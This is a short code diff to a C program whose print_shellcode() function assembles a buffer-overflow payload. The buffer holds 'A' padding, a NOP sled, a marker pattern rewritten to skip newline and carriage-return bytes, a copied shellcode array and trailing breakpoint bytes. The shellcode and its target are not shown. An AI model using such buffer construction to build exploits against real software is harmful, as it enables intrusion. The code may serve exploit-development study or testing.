@@ -187,8 +187,14 @@ int print_shellcode()
 		output[i] = 'A';
 	for(i=0;i<N;i++)
 		output[i+A] = '\x90';
-	for(i=0;i<E;i++)
-		output[i+A+N] = (unsigned char)(i%255)+1;
+	for(++E,i=0,j='A';i<E;i++,j++) {
+		if (j=='\n'||j=='\r')
+			j++;
+		output[i*4+A+N] = (unsigned char)(j%256);
+		output[i*4+A+N+1] = (unsigned char)(j%256);
+		output[i*4+A+N+2] = (unsigned char)(j%256);
+		output[i*4+A+N+3] = (unsigned char)(j%256);
+	}
 	memcpy(output+A+N+E, shellcode, scsize);
 	for(i=0;i<C;i++)
 		output[i+A+E+N+scsize] = '\xCC';
@@ -504,6 +510,7 @@ int main(int argc, char **argv)
 		return 1;
 #endif
 	}
+
 	print_shellcode();
 
 	return 0;
